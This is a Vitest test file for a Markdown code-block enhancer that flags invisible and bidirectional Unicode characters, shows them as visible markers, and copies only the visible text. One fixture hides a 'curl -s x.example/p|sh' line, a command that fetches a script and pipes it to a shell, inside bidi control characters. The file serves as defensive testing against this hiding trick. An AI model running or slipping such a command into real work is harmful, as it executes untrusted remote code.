import { afterEach, describe, expect, it, vi } from 'vitest';
import { enhanceCodeBlocks } from './code-blocks';
import { renderMarkdown } from './markdown';

const copied: string[] = [];
vi.mock('./clipboard', () => ({
  copyText: vi.fn(async (text: string) => {
    copied.push(text);
    return true;
  }),
}));

const HIDDEN = /[\u202A-\u202E\u2066-\u2069\u200B-\u200F\u2060\uFEFF\u00AD]/u;
const TROJAN = '```bash\necho ok \u2067;curl -s x.example/p|sh #\u2069\n```';

function mount(src: string): HTMLElement {
  const root = document.createElement('div');
  root.innerHTML = renderMarkdown(src);
  document.body.append(root);
  enhanceCodeBlocks(root);
  return root;
}

afterEach(() => {
  document.body.replaceChildren();
  copied.length = 0;
});

describe('enhanceCodeBlocks: hidden characters', () => {
  it('flags a block with hidden characters on its code bar', () => {
    const badge = mount(TROJAN).querySelector('.code-bar .code-warning');
    expect(badge?.textContent).toBe('Caràcters invisibles');
    expect(badge?.getAttribute('title')).toContain('⟨U+…⟩');
  });

  it('does not flag ordinary code', () => {
    const root = mount('```bash\necho ok # שלום\n```');
    expect(root.querySelector('.code-bar')).not.toBeNull();
    expect(root.querySelector('.code-warning')).toBeNull();
  });

  it('copies exactly the text shown on screen', async () => {
    const root = mount(TROJAN);
    root.querySelector<HTMLButtonElement>('.code-copy')!.click();
    await vi.waitFor(() => expect(copied).toHaveLength(1));
    const shown = root.querySelector('pre code')?.textContent;
    expect(copied[0]).toBe(shown);
    expect(copied[0]).toBe('echo ok ⟨U+2067⟩;curl -s x.example/p|sh #⟨U+2069⟩\n');
    expect(HIDDEN.test(copied[0] ?? '')).toBe(false);
  });

  it('keeps the marks when the other blocks get highlighted', async () => {
    const root = mount('```python\nprint(1)\n```\n\n' + TROJAN);
    const [plain, flagged] = [...root.querySelectorAll('pre code')] as HTMLElement[];
    await vi.waitFor(() => expect(plain?.dataset.highlighted).toBe('yes'), { timeout: 5000 });
    expect(flagged?.querySelectorAll('span.invisible-char')).toHaveLength(2);
    expect(flagged?.textContent).toBe('echo ok ⟨U+2067⟩;curl -s x.example/p|sh #⟨U+2069⟩\n');
    expect(root.querySelectorAll('.code-lang')[1]?.textContent).toBe('bash');
  });
});

describe('enhanceCodeBlocks: too many hidden characters (K13)', () => {
  it('flags the block and copies the count mark shown instead of the characters', async () => {
    const root = mount('```bash\nls' + '\u200B'.repeat(1000) + ' -la\n```');
    const badge = root.querySelector('.code-bar .code-warning');
    expect(badge?.textContent).toBe('Caràcters invisibles');
    expect(badge?.getAttribute('title')).toContain("N'hi havia massa");
    root.querySelector<HTMLButtonElement>('.code-copy')!.click();
    await vi.waitFor(() => expect(copied).toHaveLength(1));
    expect(copied[0]).toBe('ls⟨1000 caràcters invisibles eliminats⟩ -la\n');
    expect(copied[0]).toBe(root.querySelector('pre code')?.textContent);
  });
});

describe('enhanceCodeBlocks: past the marks of the whole answer (K13)', () => {
  it('still flags a block whose hidden characters went without a mark', () => {
    const prose = Array.from({ length: 2100 }, (_, i) => `p${i} \u202E`).join('\n\n');
    const root = mount(`${prose}\n\n\`\`\`bash\nls\u200B -la\n\`\`\``);
    const code = root.querySelector('pre code');
    expect(code?.textContent).toBe('ls -la\n');
    expect(code?.classList.contains('invisible-removed')).toBe(true);
    expect(root.querySelector('.code-bar .code-warning')?.getAttribute('title')).toContain('en tenia massa');
  });
});

describe('styles of the hidden-character marks (K15)', () => {
  // Vitest empties CSS imports (even ?raw), so read the stylesheet from disk.
  const node = globalThis as unknown as {
    process: { getBuiltinModule(id: 'node:fs'): { readFileSync(path: string, encoding: 'utf8'): string } };
  };
  const dir = (import.meta as ImportMeta & { dirname: string }).dirname;
  const css = node.process.getBuiltinModule('node:fs').readFileSync(`${dir}/../app.css`, 'utf8');

  /** The declarations of a global rule in app.css. */
  const rule = (selector: string): string => {
    const at = css.indexOf(`\n${selector} {`);
    expect(at, `${selector} is styled`).toBeGreaterThanOrEqual(0);
    return css.slice(at, css.indexOf('}', at));
  };

  it('shows the code bar badge as a warning, between the language and the copy button', () => {
    expect(rule('.md .code-warning')).toMatch(/color: var\(--warning\)/);
    expect(rule('.md .code-warning')).toMatch(/background: color-mix\(in srgb, var\(--warning\)/);
    expect(rule('.md .code-copy')).toMatch(/margin-left: auto/);
  });

  it('shows the marks as warnings, isolated from the text direction around them', () => {
    const marks = rule('.md .invisible-char');
    expect(marks).toMatch(/color: var\(--warning\)/);
    expect(marks).toMatch(/unicode-bidi: isolate/);
    expect(marks).toMatch(/direction: ltr/);
    expect(rule('.md .invisible-char.invisible-collapsed')).toMatch(/white-space: normal/);
  });
});
